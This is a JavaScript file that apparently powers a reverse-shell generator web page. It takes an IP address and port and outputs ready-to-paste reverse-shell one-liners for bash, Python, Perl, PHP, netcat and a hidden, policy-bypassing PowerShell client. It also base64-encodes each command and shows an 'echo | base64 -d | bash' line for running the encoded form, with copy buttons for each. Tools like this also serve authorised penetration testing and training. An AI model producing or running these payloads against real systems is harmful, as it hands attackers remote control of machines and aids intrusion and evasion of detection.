
document.addEventListener('DOMContentLoaded', function() {
  document.getElementById('currentYear').textContent = new Date().getFullYear();
  
  let ip = document.getElementById('ip').value;
  let port = document.getElementById('port').value;
  let selectedShell = 'bash';
  let protocol = 'tcp';
  
  generateCommands();
  
  document.getElementById('ip').addEventListener('input', function(e) {
    ip = e.target.value;
    generateCommands();
  });
  
  document.getElementById('port').addEventListener('input', function(e) {
    port = e.target.value;
    generateCommands();
  });
  
  const protocolRadios = document.querySelectorAll('input[name="protocol"]');
  protocolRadios.forEach(radio => {
    radio.addEventListener('change', function() {
      protocol = this.value;
      generateCommands();
    });
  });
  
  const shellOptions = document.querySelectorAll('.shell-option');
  shellOptions.forEach(option => {
    option.addEventListener('click', function() {
      shellOptions.forEach(opt => opt.classList.remove('active'));
      this.classList.add('active');
      selectedShell = this.getAttribute('data-shell');
      generateCommands();
    });
  });
  
  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      const tabId = this.getAttribute('data-tab');
      
      tabs.forEach(t => t.classList.remove('active'));
      this.classList.add('active');
      
      const tabContents = document.querySelectorAll('.tab-content');
      tabContents.forEach(content => {
        content.classList.remove('active');
        if (content.getAttribute('data-tab-content') === tabId) {
          content.classList.add('active');
        }
      });
    });
  });
  
  const copyButtons = document.querySelectorAll('.copy-button');
  copyButtons.forEach(button => {
    button.addEventListener('click', function() {
      const targetId = this.getAttribute('data-target');
      const textToCopy = document.getElementById(targetId).textContent;
      
      navigator.clipboard.writeText(textToCopy).then(() => {
        const originalIcon = this.innerHTML;
        this.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => {
          this.innerHTML = originalIcon;
        }, 2000);
        
        showToast('Command copied to clipboard');
      }).catch(err => {
        showToast('Failed to copy: ' + err, true);
      });
    });
  });
  
  function generateCommands() {
    let rawCommand = '';
    
    switch(selectedShell) {
      case 'bash':
        rawCommand = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        break;
      case 'python':
        rawCommand = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
        break;
      case 'perl':
        rawCommand = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
        break;
      case 'php':
        rawCommand = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        break;
      case 'netcat':
        rawCommand = `nc -e /bin/sh ${ip} ${port}`;
        break;
      case 'powershell':
        rawCommand = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        break;
      default:
        rawCommand = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    }
    
    document.getElementById('rawCommand').textContent = rawCommand;
    
    const encodedCommand = btoa(rawCommand);
    document.getElementById('encodedCommand').textContent = encodedCommand;
    
    const executionHint = document.querySelector('.tab-content[data-tab-content="encoded"] .terminal-text:last-child');
    if (executionHint) {
      executionHint.textContent = `echo "${encodedCommand}" | base64 -d | bash`;
    }
  }
  
  function showToast(message, isError = false) {
    let toast = document.getElementById('toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'toast';
      toast.style.position = 'fixed';
      toast.style.bottom = '20px';
      toast.style.left = '50%';
      toast.style.transform = 'translateX(-50%)';
      toast.style.padding = '10px 20px';
      toast.style.borderRadius = '4px';
      toast.style.backgroundColor = 'rgba(30, 30, 30, 0.9)';
      toast.style.color = 'white';
      toast.style.zIndex = '1000';
      toast.style.transition = 'opacity 0.3s';
      document.body.appendChild(toast);
    }
    
    toast.style.borderLeft = isError ? '4px solid #f44336' : '4px solid var(--neon-green)';
    
    toast.textContent = message;
    toast.style.opacity = '1';
    
    setTimeout(() => {
      toast.style.opacity = '0';
    }, 3000);
  }
});

if (typeof btoa === 'undefined') {
  global.btoa = function (str) {
    return Buffer.from(str, 'binary').toString('base64');
  };
}
